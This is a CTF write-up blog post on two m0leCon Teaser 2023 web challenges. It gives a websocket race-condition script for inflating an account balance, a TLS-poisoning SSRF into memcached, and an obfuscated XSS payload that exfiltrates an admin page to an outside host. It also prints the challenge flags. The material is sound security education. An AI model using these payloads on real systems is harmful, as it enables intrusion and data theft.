---
layout: post
title: m0leCon Teaser 2023 Writeup
tags: [ctf, ctf writeup, ctf web]
---

[m0leCon Teaser 2023](https://ctf.m0lecon.it/)  
[On CTFtime](https://ctftime.org/event/1898)

Overall good CTF with challenging original fun challenges.

On this page:

- [goldinospizza2](#goldinospizza2) - Web, websocket API, exploit race condition
- [Print template 2](#print-template-2) - SSRF via TLS poisoning to request Memcached. I did not solve this challenge, did the writeup based on discussions.

## goldinospizza2

The challenge was released at about 2:40 AM BST as the "[~~patched~~ *improved* version of `goldinospizza`](https://discord.com/channels/1100159162794655904/1100159163096633447/1106757967291879506)", which was about over 8 hours into the CTF. It was just before I was planning to go to bed, but the challenge looked solvable😅.

The challenge was a web challenge with a website that allowed you to order pizza with a registered account. Most of the pizzas' prices were ranging between 6 and 15, but there was one pizza named "The flagship of pizzas" that costs 1,000,000. The flag will be shown if this pizza is successfully ordered. The initial account balance is 30.

Looking through the code, there are two websocket API functions that are interesting, one is `order`, and another one is `cancel`. The `order` function is used to order a pizza, and the `cancel` function is used to cancel an order and get refund.

The `order` function is implemented as follows:

```python
def order(data, ws, n):
    # Some checks on input omitted
    for item in data["orders"]:
        # Some checks on input omitted
        if type(item["quantity"]) is not int:
            db.session.rollback()
            raise AssertionError("ONE OF YOUR 🍕 'quantity' IS NOT INT")
        if item["quantity"] <= 0:
            db.session.rollback()
            raise AssertionError("ONE OF YOUR 🍕 'quantity' IS NOT VALID")
        product = db.session.execute(db.select(Product).filter(
            Product.id == item["product"])).scalars().one_or_none()
        if product is None:
            db.session.rollback()
            raise AssertionError("WE DON'T SELL THAT 🍕")
        quantity = item["quantity"]
        current_user.balance -= product.price * quantity
        if current_user.balance < 0:
            db.session.rollback()
            raise AssertionError("NO 🍕 STEALING ALLOWED!")
        db.session.add(Order(
            user_id=current_user.id,
            product_id=product.id,
            product_quantity=quantity,
            product_price=product.price
        ))
        if product.id == 0 and quantity > 0:
            ws.send(
                f"WOW you are SO rich! Here's a little extra with your golden special 🍕: {os.environ['FLAG']}")
    db.session.add(current_user)
    db.session.commit()
    return len(data["orders"]), {"ok": True, "balance": current_user.balance, "orders": _orders()}
```

In the code, I identified that there is a race condition that can be exploited to make total order larger than we have in the balance, and cancel the order to refund so we can have more balanced than we started with.

We can blast with multiple websocket requests to make order, and if the previous order has not been committed to the database, the next request is still checked against the old balance.

To make programming easier, I did scripting within the browser console within the context of the website. After some initial test, my balance increased to 66.00 from the initial 30.00.

![Balance increased to 66.00](/assets/image/m0lecon-teaser-2023-writeup/pizza-balance.png)

The script I used to blast the order is as follows:

```javascript
let message = {
    "request": "order",
    "orders": [{
        "product": 19,
        "quantity": 9792,
    }, ],
}
for (let i = 1; i < 20; i++) {
    const ws = new WebSocket(`wss://goldinospizza2.challs.m0lecon.it/sock`);
    ws.addEventListener("open", (event) => {
        ws.send(JSON.stringify(message))
    })
}
```

The connection will get killed after some numbers of requests. To scale this up, when I repeated the process, I increased the quantity of each of the order to the amount that I can afford with the balance. Then my available balance increased increases exponentially.

With enough balance, order the golden "The flagship of pizzas", get the flag and submitted at 4:00 AM BST. Enjoy the 🍕:

```
ptm{https://youtu.be/Uzryuem5NDc lets make pizza greater than zero again https://www.giallozafferano.com/recipes/Pizza-Margherita.html}
```

The author has [a different solution](https://discord.com/channels/1100159162794655904/1100159163096633453/1108006782871285770) to desync the balance in the session and the database, with multiple order/cancel requests can be sent in one websocket request, and how the order/cancel is handled.

## Print template 2

A challenge with a web app under the misc category. IIRC the challenge was released after a while since the CTF started. It was a hard challenge, with team "organizers" first blooded it at 6:06 AM BST, and team "Kalmarunionen" submitted the flag half an hour before the CTF ends. I was not able to solve it myself. This writeup follows [Sam.ninja](https://sam.ninja/) and [pilvar](https://twitter.com/pilvar222)'s solution and payloads, which appears to be the [intended solution](https://discord.com/channels/1100159162794655904/1100159163096633453/1106990892780359771 "Just link to a Discord message that one of the challenge author Xato confirms it is the intended solution").

The webapp lets user import templates and "print" them by substitute the place holders in the template with data, and download the print.

![Import template](/assets/image/m0lecon-teaser-2023-writeup/import-template.png)

The user can also submit a "premium request" for review, which will be reviewed by the admin bot. Part of the template which renders the bot will visit is as follows:

```html
<img src=data:image/png;base64,<%= request.img %>>
<p class="my-3"><%= request.msg %></p>
```

As with `<%=` tag in EJS, the output will be HTML escaped, so it is not possible to inject script with `msg`, however it is possible to inject script in the `img` tag with `onerror` attribute.

On the web server, the file uploaded will be encoded in base64 and stored in memcached as the `img` value being used when rendering the template. With it rendered into base64, it is not possible to inject script into the `img` tag. However, if it is possible to control the content stored into memcached, it is possible to inject script into the `img` tag.

### SSRF via TLS Poisoning

We cannot make request from our machine directly, we will need to leverage SSRF to make request to memcached.

The "import template" function allows us to import template from a URL. The URL can be a http or https URL, and the server will make the request. The SSRF is exploited via TLS session resumption by injecting payload into session ID. As memcached commands are newline terminated and invalid input will be skipped, it is possible to inject command with new lines. [This TLS Poison PoC](https://github.com/jmdx/TLS-poison) is used to implement the exploit. More details about the exploit can be found in [the presentation at DEF CON Safe Mode](https://youtube.com/watch?v=qGpAJxfADjo).

With some modification to the PoC, a customised TLS server and DNS server for DNS rebinding is set up. Make HTTPS request to the TLS server, the TLS server will response a redirect with the TLS session ID being the payload. The client will be repeatedly redirected to the TLS server until the client makes another request to the DNS server, which will resolve to the target IP. As the TLS session ID is keyed by the hostname and port but not IP address, the session ID is reused for the request to the target IP. The request will be made to the target IP with the payload in the session ID.

It is shown in the image below that the payload is in the request made by the curl client to the localhost target.

![TLS Poisoning](/assets/image/m0lecon-teaser-2023-writeup/tls-poisoning.png)

### Send Payload into Memcached

When request the bot to review, the bot will visit every unvisited requests by the user where an UUID is generated and saved when the request is submitted. The UUID is also used as the key to store the request in memcached. However, the UUID is not revealed to the user. The UUID is generated with `Math.random`. The user IDs are also UUIDs generated with the same library, with knowing enough sequentially generated user IDs, it is possible to predict the future UUIDs.

In this writeup, I skipped the steps bruteforcing for the UUIDs, and just use the UUIDs that is printed to console when the request is submitted and the server generates it.

The script the bot executes is as follows:

```javascript
fetch("/")
    .then(x=>x.text())
    .then(x=>x.split("</h3>")[1].trim())
    .then(x=>fetch("http://x.cjxol.com/"+x))
```

The final payload for TLS session ID becomes the following:

```
set message_cd330b28-93e9-4524-a70b-d1a03fac941c 0 0 434
{"msg":"whatever","img":"a id=deny onerror=eval(String.fromCharCode(102,101,116,99,104,40,34,47,34,41,46,116,104,101,110,40,120,61,62,120,46,116,101,120,116,40,41,41,46,116,104,101,110,40,120,61,62,120,46,115,112,108,105,116,40,34,60,47,104,51,62,34,41,91,49,93,46,116,114,105,109,40,41,41,46,116,104,101,110,40,120,61,62,102,101,116,99,104,40,34,104,116,116,112,58,47,47,120,46,99,106,120,111,108,46,99,111,109,47,34,43,120,41,41))"}
set message_cd330b28-93e9-4524-a70b-d1a03fac941c 0 0 434
{"msg":"whatever","img":"a id=deny onerror=eval(String.fromCharCode(102,101,116,99,104,40,34,47,34,41,46,116,104,101,110,40,120,61,62,120,46,116,101,120,116,40,41,41,46,116,104,101,110,40,120,61,62,120,46,115,112,108,105,116,40,34,60,47,104,51,62,34,41,91,49,93,46,116,114,105,109,40,41,41,46,116,104,101,110,40,120,61,62,102,101,116,99,104,40,34,104,116,116,112,58,47,47,120,46,99,106,120,111,108,46,99,111,109,47,34,43,120,41,41))"}
```

The payload is repeated twice as the injection sometimes does not work as expected. The image tag sets ID to `deny` as the bot will click on the deny button which can cause a navigation before the script is executed. With image ID set as `deny`, the bot will not click on the deny button and click the image instead which does not cause a navigation.

In the `get-template` page, import template from the URL pointing to the TLS server. After a while, the web server will make request to Memcached and the payload will be stored in Memcached.

When querying Memcached directly, we can see the payload is stored in Memcached.

![Payload is in Memcached](/assets/image/m0lecon-teaser-2023-writeup/memcached.png)

When requested to review the requests, the bot will visit the page and execute the script. The flag is exfiltrated.

![Flag is exfiltrated](/assets/image/m0lecon-teaser-2023-writeup/flag.png)

The image is showing the fake flag for testing, and the real flag is:

```
ptm{why_an0ther_ch4ll_w1th_4_b0t??}
```
